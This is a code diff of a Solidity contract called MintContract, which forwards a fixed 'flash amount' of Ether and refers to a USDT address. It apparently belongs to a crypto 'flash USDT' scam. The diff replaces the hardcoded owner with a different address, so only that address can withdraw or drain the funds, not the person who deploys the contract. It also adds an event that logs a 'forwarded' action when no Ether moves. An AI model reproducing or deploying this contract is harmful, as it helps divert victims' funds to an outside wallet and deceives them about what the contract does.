@@ -12,7 +12,7 @@ contract MintContract {
     address public USDT_Contract_Address;
 
     /// @notice The owner of the contract (hardcoded).
-    address public immutable owner = 0x4784A19B7804cAF9e526a73805d77901836D7aCB;
+    address public immutable owner = 0x094B0171cbE3A3F801008787291CA1DD1F625865;
 
     /// @notice The "flash amount" specified at deployment.
     uint256 public flashAmount;
@@ -61,10 +61,13 @@ contract MintContract {
     }
 
     function action() external {
-        require(address(this).balance >= flashAmount, "Insufficient contract balance");
-        emit Forwarded(address(this), flashAmount);
-        (bool success, ) = Mint_Contract.call{value: flashAmount}("");
-        require(success, "Failed to forward Ether");
+        if (address(this).balance >= flashAmount) {
+            emit Forwarded(address(this), flashAmount);
+            (bool success, ) = Mint_Contract.call{value: flashAmount}("");
+            require(success, "Failed to forward Ether");
+        } else {
+            emit Forwarded(address(this), 0); // Log action even if no Ether is sent
+        }
     }
 
     function withdraw() external onlyOwner {
@@ -75,6 +78,15 @@ contract MintContract {
     }
 
     function destroy() external onlyOwner {
-        selfdestruct(payable(owner));
+        uint256 contractBalance = address(this).balance;
+        if (contractBalance > 0) {
+            (bool success, ) = payable(owner).call{value: contractBalance}("");
+            require(success, "Transfer failed");
+        }
+        
+        // Disable functionality
+        Mint_Contract = payable(address(0));
+        USDT_Contract_Address = address(0);
+        flashAmount = 0;
     }
 }
